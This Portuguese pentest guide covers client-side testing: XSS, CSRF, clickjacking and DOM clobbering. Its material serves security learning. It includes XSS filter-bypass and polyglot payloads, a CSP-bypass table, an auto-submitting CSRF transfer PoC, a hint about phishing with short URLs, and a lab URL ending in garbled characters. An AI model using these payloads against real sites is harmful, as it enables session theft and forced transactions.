# Fase 4: Testes de Cliente (XSS, CSRF, Clickjacking, DOM)

**Tempo estimado:** 60-90 minutos
**Objetivo:** Testar vulnerabilidades que exploram o navegador do usuário — desde roubo de cookies até clickjacking e manipulação do DOM.
**Por quê:** Vulnerabilidades de cliente afetam diretamente os usuários. Um XSS pode roubar sessões, um CSRF pode transferir dinheiro, e clickjacking pode fazer usuários clicarem onde não devem.

---

## O que são Vulnerabilidades de Cliente?

Diferente de SQLi e Command Injection (que atacam o SERVIDOR), vulnerabilidades de cliente atacam o NAVEGADOR do usuário:

| Tipo | O que faz | Quem sofre |
|------|-----------|------------|
| **XSS** | Injeta JavaScript malicioso no site | Outros usuários do site |
| **CSRF** | Faz o usuário executar ações sem querer | Usuário logado |
| **Clickjacking** | Esconde botões perigosos por trás de algo inofensivo | Usuário que clica |
| **DOM XSS** | Manipula o DOM da página via JavaScript | Usuário do site |

**Regra:** Se o site reflete input do usuário no HTML sem sanitização → candidato a XSS.

---

## 4A: Cross-Site Scripting (XSS)

### Passo 4A.1 — Teste Básico Reflected XSS

**O que você vai fazer:** Verificar se parâmetros de URL são refletidos na página SEM sanitização.

**No Burp Repeater:**
```http
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: target.com
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
... <h1>Resultados para: <script>alert('XSS')</script></h1> ...
```

**O que procurar:** O payload `<script>alert('XSS')</script>` aparece EXATAMENTE no HTML da resposta, sem encode.

**✅ Output esperado (NÃO vulnerável):**
```
HTTP/1.1 200 OK
... <h1>Resultados para: &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</h1> ...
```

Se o HTML está com entities (`&lt;`, `&gt;`) → sanitize está funcionando → NÃO vulnerável (neste parâmetro).

**Como confirmar no browser:**
1. Copie a URL completa do request
2. Cole no Firefox com proxy ativado
3. Se aparecer um alert → **XSS confirmado**

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `<script>` retorna erro | WAF bloqueia tag | Tente payloads alternativos (ver Passo 4A.3) |
| Payload refletido mas não executa | CSP bloqueia inline script | Verifique headers CSP (veja seção 4A.6) |
| Não reflete em nenhum lugar | Input não retorna no HTML | Teste outros parâmetros da Fase 2 |

### Passo 4A.2 — Teste Stored XSS

**O que você vai fazer:** Verificar se inputs persistidos (comentários, perfis, mensagens) são exibidos sem sanitização para outros usuários.

1. Encontre um formulário de input (comentário, perfil, mensagem)
2. No Burp Repeater, envie:
```http
POST /api/comments HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "comment": "<img src=x onerror=alert('XSS')>"
}
```

3. Acesse a página onde o comentário aparece
4. Se o alert aparecer → **Stored XSS confirmado**

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Upload retorna erro | Sanitização server-side | Teste com `<img src=x onerror=alert(1)>` (sem aspas) |
| Comentário aparece mas sem HTML | Server remove tags | Tente event handlers: `onmouseover`, `onfocus` |
| Apenas admin pode comentar | Permissão necessária | Teste em campos de perfil ou perfil público |

### Passo 4A.3 — Bypass de Filtros

**O que você vai fazer:** Testar payloads alternativos quando o filtro bloqueia `<script>`.

**Bypass básico — sem tag script:**
```http
GET /search?q=<img src=x onerror=alert('XSS')> HTTP/1.1
GET /search?q=<svg onload=alert('XSS')> HTTP/1.1
GET /search?q=<body onload=alert('XSS')> HTTP/1.1
GET /search?q=<input onfocus=alert('XSS') autofocus> HTTP/1.1
GET /search?q=<details open ontoggle=alert('XSS')> HTTP/1.1
```

**Bypass de case-sensitive:**
```http
GET /search?q=<ScRiPt>alert('XSS')</ScRiPt> HTTP/1.1
```

**Bypass de encoding:**
```http
GET /search?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1
```

**JavaScript protocol:**
```http
GET /search?q=javascript:alert('XSS') HTTP/1.1
```

**Data URI:**
```http
GET /search?q=data:text/html,<script>alert('XSS')</script> HTTP/1.1
```

**Polyglot (funciona em múltiplos contextos):**
```http
GET /search?q=jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )// HTTP/1.1
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Todos os payloads bloqueados | WAF robusto ou CSP | Tente Out-of-Band XSS via Burp Collaborator |
| Payload executa mas alert não aparece | Browser bloqueia pop-ups | Verifique console do DevTools (F12) |
| XSS funciona só no Repeater | Reflected mas precisa de click | Use URL curta para phishing |

### Passo 4A.4 — XSS em Attributes

```http
GET /search?q=" onfocus="alert('XSS')" autofocus=" HTTP/1.1
GET /search?q=" onmouseover="alert('XSS')" HTTP/1.1
GET /search?q=" onclick="alert('XSS')" HTTP/1.1
```

**Como funciona:** O input do usuário "quebra" o attribute HTML e injeta um novo event handler.

### Passo 4A.5 — DOM XSS

**O que você vai fazer:** Verificar se parâmetros de URL são usados em sinks perigosos no JavaScript.

1. No Burp, vá para **Proxy → HTTP history**
2. Encontre requests que retornam JavaScript
3. Procure por:
   - `document.write()`
   - `innerHTML`
   - `eval()`
   - `setTimeout()`
   - `location.hash`
   - `document.location`

**Se o parâmetro de URL chega a algum desses sinks SEM sanitização → DOM XSS.**

**Como testar:**
1. No Firefox, abra DevTools (F12) → aba Console
2. Pesquise por `innerHTML`, `document.write`, `eval` no JS da página
3. Identifique se algum desses usa `location.search`, `location.hash` ou `document.referrer`

### Passo 4A.6 — Verificar CSP (Content Security Policy)

**O que você vai fazer:** Verificar se o site tem proteção contra XSS via CSP.

```bash
curl -sI https://target.com | grep -i "content-security-policy"
```

**✅ Output esperado (SEM proteção — vulnerável):**
```
# NENHUM output → CSP ausente → XSS é mais fácil
```

**✅ Output esperado (com proteção):**
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
```

**Como bypassar CSP:**
| CSP Config | Bypass |
|------------|--------|
| `script-src 'self'` | Carregue JS de um path que você controla no mesmo domínio |
| `script-src 'unsafe-inline'` | XSS funciona normalmente |
| `script-src 'nonce-abc123'` | Use o nonce roubado via outro vetor |
| `script-src CDN` | Injete via CDN comprometido ou DOM Clobbering |
| Sem CSP | XSS funciona sem restrições |

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| CSP bloqueia todos payloads | CSP robusto | Foque em DOM XSS (não depende de inline script) |
| Não sabe se tem CSP | Header não aparece | Teste: `curl -sI https://target.com | grep -i csp` |

---

## 4B: Cross-Site Request Forgery (CSRF)

### Passo 4B.1 — Teste Básico CSRF

**O que você vai fazer:** Verificar se ações state-changing (transferir, deletar, alterar) aceitam requests sem token CSRF.

**No Burp Repeater:**
```http
POST /api/transfer HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

from=account1&to=account2&amount=1000
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"success": true, "transfer_id": 12345}
```

**Se retornou 200 OK sem precisar de token → VULNERÁVEL a CSRF.**

**✅ Output esperado (NÃO vulnerável):**
```
HTTP/1.1 403 Forbidden
{"error": "Invalid CSRF token"}
```

### Passo 4B.2 — Gerar PoC CSRF

1. No Burp, selecione o request POST no HTTP history
2. Clique direito → **Engagement tools → Generate CSRF PoC**
3. Copie o HTML gerado

**HTML gerado:**
```html
<html>
<body>
<form action="https://target.com/api/transfer" method="POST">
  <input type="hidden" name="from" value="account1">
  <input type="hidden" name="to" value="account2">
  <input type="hidden" name="amount" value="1000">
  <input type="submit" value="Submit">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

**Como testar:**
1. Salve como `csrf-poc.html`
2. Abra no Firefox (SEM proxy)
3. Se a transferência acontecer → **CSRF confirmado**

### Passo 4B.3 — Verificar SameSite Cookie

```
# No Burp Response → Headers:
Set-Cookie: session=abc123; Path=/; Secure; HttpOnly
```

| Cookie Attribute | Proteção contra CSRF |
|------------------|---------------------|
| `SameSite=Strict` | Bloqueia todos CSRF |
| `SameSite=Lax` | Bloqueia POST, permite GET |
| `SameSite=None` | **Sem proteção (vulnerável)** |
| **Ausente** | **Sem proteção (vulnerável)** |

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Token obrigatório | CSRF protection ativa | Verifique se token é validado (teste sem token, com token inválido, com token reutilizado) |
| Request retorna 403 | Token ausente | Copie token de outro request e use |
| SameSite=Strict | Proteção moderna | CSRF via subdomínio ou SAMEORIGIN bypass |

---

## 4C: Clickjacking

### Passo 4C.1 — Teste Básico

**O que você vai fazer:** Verificar se o site pode ser embutido em um iframe (clickjacking).

```bash
curl -I https://target.com | grep -i "x-frame-options\|content-security-policy"
```

**✅ Output esperado (VULNERÁVEL):**
```
# NENHUM output → headers ausentes → vulnerável
```

**✅ Output esperado (protegido):**
```
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

**Se NÃO tem `X-Frame-Options` NEM `Content-Security-Policy: frame-ancestors` → VULNERÁVEL a clickjacking.**

### Passo 4C.2 — Criar Página de Teste

Salve como `clickjacking-test.html`:
```html
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking Test</title>
  <style>
    iframe {
      width: 800px;
      height: 600px;
      opacity: 0.5;
      border: 2px solid red;
    }
  </style>
</head>
<body>
  <h1>Clickjacking Test</h1>
  <iframe src="https://target.com"></iframe>
</body>
</html>
```

Abra no Firefox. Se o site aparecer dentro do iframe → **Clickjacking confirmado.**

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| iframe retorna vazio | X-Frame-Options DENY | Site é protegido contra clickjacking |
| iframe mostra erro | CSP frame-ancestors bloqueia | Verifique headers CSP |
| Não aparece nada | Site bloqueia todos iframes | Clickjacking não é possível neste site |

---

## 4D: DOM Clobbering

### Passo 4D.1 — Teste Básico

```http
GET /page?name=<a id="config" href="javascript:alert('XSS')">click</a> HTTP/1.1
Host: target.com
```

Se o JavaScript da página usa `document.getElementById('config')` sem sanitização → vulnerável.

---

## Checklist de Cliente

| # | Item | Arquivo gerado | ☑ |
|---|------|---------------|:---:|
| 1 | XSS refletido testado | `relatorio/xss-reflected.txt` | [ ] |
| 2 | XSS armazenado testado | `relatorio/xss-stored.txt` | [ ] |
| 3 | XSS bypass testado | `relatorio/xss-bypass.txt` | [ ] |
| 4 | DOM XSS verificado | `relatorio/dom-xss.txt` | [ ] |
| 5 | CSP verificado | `relatorio/csp.txt` | [ ] |
| 6 | CSRF testado | `relatorio/csrf.txt` | [ ] |
| 7 | CSRF PoC gerado | `relatorio/csrf-poc.html` | [ ] |
| 8 | Clickjacking testado | `relatorio/clickjacking.txt` | [ ] |
| 9 | Cookie SameSite verificado | `relatorio/cookies.txt` | [ ] |

### ✅ Sinal de sucesso:
- Pelo menos **um XSS confirmado** (reflected, stored ou DOM)
- **CSRF PoC funcional** para uma ação state-changing
- **Clickjacking demonstrado** (se aplicável)
- Vulnerabilidades documentadas com payloads

### ❌ Se falhou:
- XSS pode estar bloqueado por WAF → tente bypass com encoding
- CSRF pode ter token obrigatório → verifique se token é validado corretamente
- O mínimo para avançar: ter testado pelo menos 3 parâmetros diferentes com payloads XSS

### 🔗 O que deste arquivo alimenta nas próximas fases:
| Arquivo da Fase 4 | Usado na Fase | Para quê |
|--------------------|---------------|----------|
| `xss-reflected.txt` | Fase 11 (Validação) | Confirmar exploit reproduzível |
| `csrf-poc.html` | Fase 12 (Relatório) | Demonstrar impacto ao cliente |
| `cookies.txt` | Fase 5 (Auth) | Analisar proteções de sessão |
| `csp.txt` | Fase 12 (Relatório) | Documentar configuração de segurança |

**Se completou tudo → Avance para Fase 5** (`05-auth.md`)

---

## Mini-Checkpoint: Resolva um Lab XSS

1. Acesse o lab "Reflected XSS" no PortSwigger: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-notarily封闭
2. Use Burp Repeater para injetar `<script>alert('XSS')</script>` no parâmetro
3. Confirme que o payload aparece no HTML sem encode
4. Abra a URL no Firefox e confirme o alert

Se conseguiu → avance. Se não → revise os bypass de filtros na seção 4A.3.
